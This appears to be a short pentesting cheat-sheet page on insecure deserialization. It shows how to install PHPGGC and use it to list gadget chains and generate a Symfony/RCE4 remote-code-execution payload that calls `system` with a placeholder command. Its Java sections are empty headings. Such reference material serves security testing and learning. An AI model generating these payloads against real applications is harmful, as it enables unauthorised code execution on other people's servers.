---
title: Insecure Deserialization
description: Insecure deserialization is when user-controllable data is deserialized by a website. This potentially enables an attacker to manipulate serialized objects in order to pass harmful data into the application code.
badge: Web
---


## PHP

### PHP's Serialized objects format

### PHPGGC

PGP Generic Gadget Chains (PHPGGC)

#### Installation

<smart-tabs variable="tool-docker-vs-cli" :tabs="{'docker': 'Docker', 'cli': 'Command Line'}">
<template v-slot:docker>

Simply clone the repo, build the image and tag it like you want:
```bash
git clone "https://github.com/ambionics/phpggc.git" {{ tmp-dir /tmp/phpgcc }}
docker build -t {{ image-tag phpggc }} {{ tmp-dir /tmp/phpgcc }}
```


</template>
<template v-slot:cli>

> PHP >= 5.6 is required to run PHPGGC.
```bash
git clone https://github.com/ambionics/phpggc.git phpgcc
```
The executable will be at `${PWD}/phpgcc/phpgcc`. It is advisable to add it to your path

</template>
</smart-tabs>




#### Usage
You can list the available gadgets with phpggc -l:

<smart-tabs variable="tool-docker-vs-cli" :tabs="{'docker': 'Docker', 'cli': 'Command Line'}">
<template v-slot:docker>

```bash
docker run --rm {{ image-tag phpggc }} -l
```

</template>
<template v-slot:cli>

```bash
phpggc  -l
```

</template>
</smart-tabs>


Usually this gadget chains ask you to specify a function to be called and arguments. Typically you will be going for RCEs, so here is an example using the `system` function:

<smart-tabs variable="tool-docker-vs-cli" :tabs="{'docker': 'Docker', 'cli': 'Command Line'}">
<template v-slot:docker>

```bash
docker run --rm {{ image-tag phpggc }} -b "Symfony/RCE4" "system" "{{ payload id }}" | clip.exe
```

</template>
<template v-slot:cli>

```bash
phpggc -b "Symfony/RCE4" "system" "{{ payload id }}" | clip.exe
```

</template>
</smart-tabs>



## Java

### ysoserial

### Using custom gadget chains
